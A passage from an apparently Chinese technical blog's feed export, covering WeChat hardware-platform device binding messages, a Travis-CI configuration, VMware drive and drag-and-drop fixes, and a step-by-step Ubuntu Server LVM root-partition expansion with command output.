<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ToUserName</span>&gt;</span>&lt;![CDATA[gh_44d240793a14]]&gt;<span class="tag">&lt;/<span class="name">ToUserName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">FromUserName</span>&gt;</span>&lt;![CDATA[oQyEgw2RrBdvRkFm-X2dTCcDlT8I]]&gt;<span class="tag">&lt;/<span class="name">FromUserName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">CreateTime</span>&gt;</span>1544586669<span class="tag">&lt;/<span class="name">CreateTime</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">MsgType</span>&gt;</span>&lt;![CDATA[device_event]]&gt;<span class="tag">&lt;/<span class="name">MsgType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Event</span>&gt;</span>&lt;![CDATA[bind]]&gt;<span class="tag">&lt;/<span class="name">Event</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">DeviceType</span>&gt;</span>&lt;![CDATA[gh_44d240793a14]]&gt;<span class="tag">&lt;/<span class="name">DeviceType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">DeviceID</span>&gt;</span>&lt;![CDATA[RSJMPLUG00002223]]&gt;<span class="tag">&lt;/<span class="name">DeviceID</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Content</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SessionID</span>&gt;</span>0<span class="tag">&lt;/<span class="name">SessionID</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">OpenID</span>&gt;</span>&lt;![CDATA[oQyEgw2RrBdvRkFm-X2dTCcDlT8I]]&gt;<span class="tag">&lt;/<span class="name">OpenID</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>总结：该方案利用绑定、解绑事件实现了用户和设备的绑定，应用场景即可根据需求开展。</p>
<p>举例：我的设备是一块 <code>微信相框</code> ，在公众号上发送一张照片，<code>微信云</code> 推送到服务器，服务器通讯绑定关系，将照片通过自己定义的通讯协议推送给<code>微信相框</code>，<code>微信相框</code>就可以把照片显示出来了。</p>
<h2 id="二、微信硬件云标准接入方案"><a href="#二、微信硬件云标准接入方案" class="headerlink" title="二、微信硬件云标准接入方案"></a>二、微信硬件云标准接入方案</h2><blockquote>
<p>摘录微信：若选择该方案，设备消息将以 <code>Json</code> 格式发送到开发者在 <code>设备功能/设置</code> 填写的服务器地址<br>该方案的产品可拥有微信硬件平台制定的产品标准能力，实现设备互联与数据互通。</p>
</blockquote>
<p><img src="/images/weixin/微信硬件云标准接入方案.png" alt="微信硬件云标准接入方案.png"></p>
<h4 id="设备直连微信硬件云通道"><a href="#设备直连微信硬件云通道" class="headerlink" title="设备直连微信硬件云通道"></a>设备直连微信硬件云通道</h4><blockquote>
<p>摘录微信：设备可通过微信硬件平台提供的直连SDK，直接与微信硬件云对接</p>
</blockquote>
<p>这部分是硬件直接连接微信云，不需要自己搭建服务器了，不是我们要对接的部分，省略。</p>
<h4 id="厂商云连接微信硬件云通道"><a href="#厂商云连接微信硬件云通道" class="headerlink" title="厂商云连接微信硬件云通道"></a>厂商云连接微信硬件云通道</h4><blockquote>
<p>摘录微信：设备连接厂商服务器后，可通过设备 <code>openAPI</code> 与微信硬件云对接。</p>
</blockquote>
<p>这种方案用的比较多，大部分产商都是用此方案。该方案要在 <code>设备功能/设置</code> 配置服务器URL，这个URL一样需要验证，但是接收的数据将不是 <code>xml</code> 格式，而是 <code>json</code> 格式，所以这个URL最好和 <code>公众平台/基本配置</code> 的不一样。</p>
<p><a href="https://mp.weixin.qq.com/debug/" target="_blank" rel="noopener">调试工具</a> 没有测试 <code>微信IoT云</code> 推送事件的功能，只有测试 <code>服务器</code> 通知 <code>微信IoT云</code> 的接口。</p>
<p>不过没关系，我们先配置好服务器URL，进入”设备功能”，点击”添加产品” 添加一个产品，通过 <a href="https://mp.weixin.qq.com/debug/" target="_blank" rel="noopener">调试工具</a> 生成一个设备ID二维码，用微信扫描，直接绑定设备，就能收到推送事件。</p>
<p><code>扫码绑定</code> 通知消息格式（解绑相同）：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"device_id"</span>: <span class="string">"xxxxx"</span>,</span><br><span class="line">	<span class="attr">"device_type"</span>: <span class="string">"xxxxxx"</span>,</span><br><span class="line">	<span class="attr">"msg_id"</span>: <span class="number">657728900</span>,</span><br><span class="line">	<span class="attr">"msg_type"</span>: <span class="string">"bind"</span>,</span><br><span class="line">	<span class="attr">"create_time"</span>: <span class="number">1544600955</span>,</span><br><span class="line">	<span class="attr">"open_id"</span>: <span class="string">"xxxxx"</span>,</span><br><span class="line">	<span class="attr">"session_id"</span>: <span class="number">0</span>,</span><br><span class="line">	<span class="attr">"content"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"qrcode_suffix_data"</span>: <span class="string">"xxxxxxx=="</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收到事件之后，需要异步处理，这一点和 <code>平台基础接入方案</code> 的阻塞处理不同。假如收到绑定事件，要立刻响应结果（内容不重要），服务器在处理完绑定事件之后，需要发送一个POST请求到 <code>微信IoT云</code> ，告诉它我们服务器处理的结果。</p>
<p>这里只接受绑定和解绑的事件，功能其实和 <code>平台基础接入方案</code> 一样。</p>
<p>另外这个方案主要是使用 <a href="https://iot.weixin.qq.com/wiki/new/index.html?page=3-5-4" target="_blank" rel="noopener">《微信硬件平台设备端OpenAPI》</a> ，这个东西的作用就是：<code>微信IoT云</code> 和  <code>设备</code> 通信，而通信的中间人就是我们在 <code>设备功能/设置</code> 填入的URL <code>服务器</code> 。</p>
<p>通信都是异步方式，类型分为三类：</p>
<ol>
<li><code>微信IoT云</code> 向服务器查询设备消息</li>
<li><code>微信IoT云</code> 向服务器设置设备消息</li>
<li>服务器通知<code>微信IoT云</code>消息</li>
</ol>
<p><a href="https://iot.weixin.qq.com/wiki/doc/hardwarecloud/openapidevice.pdf" target="_blank" rel="noopener">《微信硬件设备于端数据接口》</a></p>
<h2 id="方案选择"><a href="#方案选择" class="headerlink" title="方案选择"></a>方案选择</h2><p>如果不需要用到 <code>OpenAPI</code> 的话，其实<code>厂商云连接微信硬件云通道</code>  和  <code>平台基础接入方案</code> 都可以，只需要绑定关系即可，<code>厂商云连接微信硬件云通道</code> 的功能更加强大。</p>
]]></content>
      <categories>
        <category>微信公众平台</category>
      </categories>
      <tags>
        <tag>微信公众平台</tag>
      </tags>
  </entry>
  <entry>
    <title>Travis-CI 使用介绍</title>
    <url>/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90CI/Travis-CI%20%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><a href="https://travis-ci.org" target="_blank" rel="noopener">travis-ci</a> 是在线托管的CI服务，用Travis来进行持续集成，不需要自己搭服务器，使用方便，对Github开源项目是免费的，支持多数主流语言。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol>
<li>登录<a href="https://travis-ci.org" target="_blank" rel="noopener">Travis官网</a> ，用Github账号登录。</li>
<li>首次登录，授权给Travis访问你的GitHub代码库</li>
<li>把需要CI的项目（UIAutomatorTest）勾选上</li>
<li>点击 “hebbely/UiAutomatorTest”，进入该项目”More Options”-“Setting” ，打开选项”Build ..yml” 和 “Build pushed branches”</li>
<li>添加.travis.yml</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">java</span></span><br><span class="line"><span class="attr">jdk:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">oraclejdk8</span></span><br><span class="line"><span class="attr">script:</span> <span class="string">"mvn clean package -Dmaven.test.skip=true"</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line">  <span class="attr">email:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">xxx@qq.com</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>持续集成CI</category>
      </categories>
  </entry>
  <entry>
    <title>VMWare CD/DVD 驱动器的类型</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare%20CD-DVD%20%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p><code>CD/DVD</code> 驱动器的类型：</p>
<ol>
<li>如果选择操作系统为XP的话，<code>CD/DVD</code> 驱动器默认是IDE类型。</li>
<li><p>如果选择操作系统为Win7的话，<code>CD/DVD</code> 驱动器默认是SATA类型。</p>
<p><code>CD/DVD</code> 驱动器底下有一个“高级”按钮，可以修改驱动器的类型。</p>
</li>
</ol>
<p><img src="/images/虚拟化技术&amp;云平台/VMWare光驱XP默认类型.png" alt><br><img src="/images/虚拟化技术&amp;云平台/VMWare光驱设置.jpg" alt></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>VMWare14宿主机之间无法拖文件</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare14%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E6%97%A0%E6%B3%95%E6%8B%96%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><code>VMware® Workstation 14 Pro</code> 版本<code>14.1.1 build-7528167</code>，主机是<code>Windows10</code>，宿主机是<code>Ubuntu18.04</code>。</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>成功安装 <code>VMware Tools</code> ，但是无法从Win10拖文件到Ubuntu，也无法共享复制/粘贴。</p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>在安装完VMWare Tools之后，重启Ubuntu，接着安装 <code>open-vm-tools-desktop</code>，安装完成再次重启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install open-vm-tools-desktop</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu Server 扩展磁盘空间LVM</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/Ubuntu%20Server%20%E6%89%A9%E5%B1%95%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4LVM/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在《VMWare为Ubuntu添加硬盘》一文中，我尝试为虚拟机增加一块磁盘挂载了 <code>/data</code> 路径下，这可以解决在“出现磁盘耗尽预警”之前增加磁盘，尽量将新的文件都放到 <code>/data</code> 路径下。</p>
<p>如果应用的数据无法迁移，需扩展根分区  <code>/</code> 的空间， 上面的方法则无法满足我的需求。</p>
<h2 id="GParted"><a href="#GParted" class="headerlink" title="GParted"></a>GParted</h2><p>对于VMWare虚拟机，还可以考虑对虚拟机磁盘进行扩容，如：</p>
<p><img src="/images/虚拟化技术&amp;云平台/vm-磁盘扩展.png" alt></p>
<p>这种方式对桌面版系统环境(单磁盘)可能会比较合适，扩展后利用 <code>GParted软件</code> 重新调整 <code>/dev/sdb1</code> 即可，有兴趣可以参考<a href="https://blog.csdn.net/weixin_37845219/article/details/115359593" target="_blank" rel="noopener">【<br>ubuntu下对根目录磁盘扩容】</a> 。</p>
<blockquote>
<p>注意：GParted是一个GUI软件可以在桌面系统中安装启动 或者 下载iso文件挂载在光驱启动</p>
</blockquote>
<p>但我没有尝试成功，为什么？<br>因为我们使用的是 <code>ubuntu server 14.04</code> ，服务器版的默认都是LVM磁盘阵列，我没有专门学过LVM，但知道他比单硬盘复杂，他可以将多个硬盘虚拟化为一个硬盘。所以GParted处理起来没那么简单，所以我尝试一次就放弃了GParted，因为LVM本身就是能满足扩容需求的。</p>
<h2 id="开始LVM扩容"><a href="#开始LVM扩容" class="headerlink" title="开始LVM扩容"></a>开始LVM扩容</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>给VM增加一块硬盘（和物理机场景一样），加入到LVM中。</p>
<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>一台老虚拟机服务器磁盘空间即将耗尽，导致现在无法对Gitlab进行备份操作，现在打算对系统根分区进行空间扩展，增加100G空间。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)</span><br><span class="line"></span><br><span class="line">root@bogon:~<span class="comment"># df -lh</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            2.9G  4.0K  2.9G   1% /dev</span><br><span class="line">tmpfs           596M  3.2M  592M   1% /run</span><br><span class="line">/dev/dm-0        19G   16G  1.9G  90% /</span><br><span class="line">none            4.0K     0  4.0K   0% /sys/fs/cgroup</span><br><span class="line">none            5.0M     0  5.0M   0% /run/lock</span><br><span class="line">none            3.0G  4.0K  3.0G   1% /run/shm</span><br><span class="line">none            100M     0  100M   0% /run/user</span><br><span class="line">/dev/sda1       236M   41M  183M  19% /boot</span><br></pre></td></tr></table></figure></p>
<h3 id="1-添加一块新硬盘"><a href="#1-添加一块新硬盘" class="headerlink" title="1. 添加一块新硬盘"></a>1. 添加一块新硬盘</h3><p>在“虚拟机设置” - “添加” - “硬盘” 给VM虚拟机添加一块100G的硬盘，重启虚拟机。</p>
<h3 id="2-查看所有硬盘信息"><a href="#2-查看所有硬盘信息" class="headerlink" title="2. 查看所有硬盘信息"></a>2. 查看所有硬盘信息</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 21.5 GB, 21474836480 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2610 cylinders, total 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x000b8cbd</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048      499711      248832   83  Linux</span><br><span class="line">/dev/sda2          501758    41940991    20719617    5  Extended</span><br><span class="line">/dev/sda5          501760    41940991    20719616   8e  Linux LVM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里已经识别出新硬盘100G</span></span><br><span class="line">Disk /dev/sdb: 107.4 GB, 107374182400 bytes</span><br><span class="line">255 heads, 63 sectors/track, 13054 cylinders, total 209715200 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb doesn<span class="string">'t contain a valid partition table</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Disk /dev/mapper/bogon--vg-root: 20.1 GB, 20124270592 bytes</span></span><br><span class="line"><span class="string">255 heads, 63 sectors/track, 2446 cylinders, total 39305216 sectors</span></span><br><span class="line"><span class="string">Units = sectors of 1 * 512 = 512 bytes</span></span><br><span class="line"><span class="string">Sector size (logical/physical): 512 bytes / 512 bytes</span></span><br><span class="line"><span class="string">I/O size (minimum/optimal): 512 bytes / 512 bytes</span></span><br><span class="line"><span class="string">Disk identifier: 0x00000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Disk /dev/mapper/bogon--vg-root doesn'</span>t contain a valid partition table</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-swap_1: 1069 MB, 1069547520 bytes</span><br><span class="line">255 heads, 63 sectors/track, 130 cylinders, total 2088960 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-swap_1 doesn<span class="string">'t contain a valid partition table</span></span><br></pre></td></tr></table></figure>
<h3 id="3-新增主分区"><a href="#3-新增主分区" class="headerlink" title="3. 新增主分区"></a>3. 新增主分区</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># fdisk /dev/sdb </span></span><br><span class="line">Device contains neither a valid DOS partition table, nor Sun, SGI or OSF disklabel</span><br><span class="line">Building a new DOS disklabel with disk identifier 0x6f04a426.</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">After that, of course, the previous content won ’t be recoverable.</span><br><span class="line"></span><br><span class="line">Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p</span><br><span class="line">Partition number (1-4, default 1): 1</span><br><span class="line">First sector (2048-209715199, default 2048): </span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-209715199, default 209715199): </span><br><span class="line">Using default value 209715199</span><br><span class="line"></span><br><span class="line"><span class="comment"># w保存更改</span></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line"><span class="comment"># 重启读取分区表</span></span><br><span class="line">root@bogon:~<span class="comment"># partprobe /dev/sdb</span></span><br><span class="line">root@bogon:~<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 21.5 GB, 21474836480 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2610 cylinders, total 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x000b8cbd</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048      499711      248832   83  Linux</span><br><span class="line">/dev/sda2          501758    41940991    20719617    5  Extended</span><br><span class="line">/dev/sda5          501760    41940991    20719616   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 107.4 GB, 107374182400 bytes</span><br><span class="line">43 heads, 44 sectors/track, 110843 cylinders, total 209715200 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x6f04a426</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdb1            2048   209715199   104856576   83  Linux</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-root: 20.1 GB, 20124270592 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2446 cylinders, total 39305216 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-root doesn’t contain a valid partition table</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-swap_1: 1069 MB, 1069547520 bytes</span><br><span class="line">255 heads, 63 sectors/track, 130 cylinders, total 2088960 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/bogon--vg-swap_1 doesn’t contain a valid partition table</span><br></pre></td></tr></table></figure>
<h3 id="4-创建新的物理卷"><a href="#4-创建新的物理卷" class="headerlink" title="4. 创建新的物理卷"></a>4. 创建新的物理卷</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># pvcreate /dev/sdb1</span></span><br><span class="line">  Physical volume <span class="string">"/dev/sdb1"</span> successfully created</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示目前存在的物理卷信息</span></span><br><span class="line">root@bogon:~<span class="comment"># pvdisplay </span></span><br><span class="line">  --- Physical volume ---</span><br><span class="line">  PV Name               /dev/sda5</span><br><span class="line">  VG Name               bogon-vg</span><br><span class="line">  PV Size               19.76 GiB / not usable 2.00 MiB</span><br><span class="line">  Allocatable           yes </span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              5058</span><br><span class="line">  Free PE               5</span><br><span class="line">  Allocated PE          5053</span><br><span class="line">  PV UUID               HSucTv-jtIU-itcZ-VmXp-ygRg-Xe02-uC0I8u</span><br><span class="line">   </span><br><span class="line">  <span class="string">"/dev/sdb1"</span> is a new physical volume of <span class="string">"100.00 GiB"</span></span><br><span class="line">  --- NEW Physical volume ---</span><br><span class="line">  PV Name               /dev/sdb1</span><br><span class="line">  VG Name               </span><br><span class="line">  PV Size               100.00 GiB</span><br><span class="line">  Allocatable           NO</span><br><span class="line">  PE Size               0   </span><br><span class="line">  Total PE              0</span><br><span class="line">  Free PE               0</span><br><span class="line">  Allocated PE          0</span><br><span class="line">  PV UUID               BEN0cc-twRr-d419-GdCC-BJ5a-3I3x-OwxNHH</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#显示存在的卷组</span></span><br><span class="line">root@bogon:~<span class="comment"># vgdisplay </span></span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               bogon-vg</span><br><span class="line">  System ID             </span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        1</span><br><span class="line">  Metadata Sequence No  3</span><br><span class="line">  VG Access             <span class="built_in">read</span>/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                2</span><br><span class="line">  Open LV               2</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                1</span><br><span class="line">  Act PV                1</span><br><span class="line">  VG Size               19.76 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              5058</span><br><span class="line">  Alloc PE / Size       5053 / 19.74 GiB</span><br><span class="line">  Free  PE / Size       5 / 20.00 MiB</span><br><span class="line">  VG UUID               eW4kvx-NYtj-Udfe-NZCZ-ITzN-Ibbz-31na6C</span><br></pre></td></tr></table></figure>
<p>得到以下关键信息：</p>
<ul>
<li>卷组 <code>VG Name: bogon-vg</code></li>
<li>卷组大小 <code>VG Size: 19.76 GiB</code></li>
<li>可分配的空间 <code>Free  PE / Size: 5 / 20.00 MiB</code> </li>
</ul>
<p>可分配的空间仅20MiB，所以我们要添加一个新的物理卷到卷组 <code>bogon-vg</code> </p>
<h3 id="5-扩展卷组"><a href="#5-扩展卷组" class="headerlink" title="5. 扩展卷组"></a>5. 扩展卷组</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把物理卷/dev/sdb1 扩展添加到卷组 bogon-vg 中</span></span><br><span class="line">root@bogon:~<span class="comment"># vgextend bogon-vg /dev/sdb1</span></span><br><span class="line">  Volume group <span class="string">"bogon-vg"</span> successfully extended</span><br><span class="line">root@bogon:~<span class="comment"># vgdisplay </span></span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               bogon-vg</span><br><span class="line">  System ID             </span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        2</span><br><span class="line">  Metadata Sequence No  4</span><br><span class="line">  VG Access             <span class="built_in">read</span>/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                2</span><br><span class="line">  Open LV               2</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                2</span><br><span class="line">  Act PV                2</span><br><span class="line">  VG Size               119.75 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              30657</span><br><span class="line">  Alloc PE / Size       5053 / 19.74 GiB</span><br><span class="line">  Free  PE / Size       25604 / 100.02 GiB  <span class="comment">#增加100G可用空间</span></span><br><span class="line">  VG UUID               eW4kvx-NYtj-Udfe-NZCZ-ITzN-Ibbz-31na6C</span><br></pre></td></tr></table></figure>
<h3 id="6-扩展逻辑卷"><a href="#6-扩展逻辑卷" class="headerlink" title="6. 扩展逻辑卷"></a>6. 扩展逻辑卷</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看逻辑卷</span></span><br><span class="line">root@bogon:~<span class="comment"># lvdisplay </span></span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/bogon-vg/root</span><br><span class="line">  LV Name                root</span><br><span class="line">  VG Name                bogon-vg</span><br><span class="line">  LV UUID                dPvAEs-EUUu-nxlD-EU21-pHP1-qL5q-LTncQ6</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time bogon, 2017-04-18 15:13:48 +0800</span><br><span class="line">  LV Status              available</span><br><span class="line">  <span class="comment"># open                 1</span></span><br><span class="line">  LV Size                18.74 GiB</span><br><span class="line">  Current LE             4798</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">  - currently <span class="built_in">set</span> to     256</span><br><span class="line">  Block device           252:0</span><br><span class="line">   </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/bogon-vg/swap_1</span><br><span class="line">  LV Name                swap_1</span><br><span class="line">  VG Name                bogon-vg</span><br><span class="line">  LV UUID                0BSenv-UESB-hH9X-zRUv-xZsD-pjdk-kNMx4N</span><br><span class="line">  LV Write Access        <span class="built_in">read</span>/write</span><br><span class="line">  LV Creation host, time bogon, 2017-04-18 15:13:48 +0800</span><br><span class="line">  LV Status              available</span><br><span class="line">  <span class="comment"># open                 2</span></span><br><span class="line">  LV Size                1020.00 MiB</span><br><span class="line">  Current LE             255</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">  - currently <span class="built_in">set</span> to     256</span><br><span class="line">  Block device           252:1</span><br><span class="line"><span class="comment"># 扩展逻辑卷为120G(注意：这里是最终大小，而不是增加的大小)</span></span><br><span class="line">root@bogon:~<span class="comment"># lvextend -L 120G /dev/bogon-vg/root </span></span><br><span class="line">  Extending logical volume root to 120.00 GiB</span><br><span class="line">  <span class="comment">#空间不太够:  25922 - 25604 = 318</span></span><br><span class="line">  Insufficient free space: 25922 extents needed, but only 25604 available </span><br><span class="line">root@bogon:~<span class="comment"># </span></span><br><span class="line"><span class="comment"># 试一下扩展逻辑卷为119G</span></span><br><span class="line">root@bogon:~<span class="comment"># lvextend -L 119G /dev/bogon-vg/root </span></span><br><span class="line">  Extending logical volume root to 119.00 GiB</span><br><span class="line">  <span class="comment">#空间不太够:  25666 - 25604 = 62，应该指定118G就可以了</span></span><br><span class="line">  Insufficient free space: 25666 extents needed, but only 25604 available </span><br><span class="line"><span class="comment"># 还有一个方法，直接分配所有可用空间  </span></span><br><span class="line">root@bogon:~<span class="comment"># lvextend -l +100%FREE /dev/bogon-vg/root </span></span><br><span class="line">  Extending logical volume root to 118.76 GiB</span><br><span class="line">  Logical volume root successfully resized <span class="comment"># 逻辑卷大小已经扩展成功</span></span><br></pre></td></tr></table></figure>
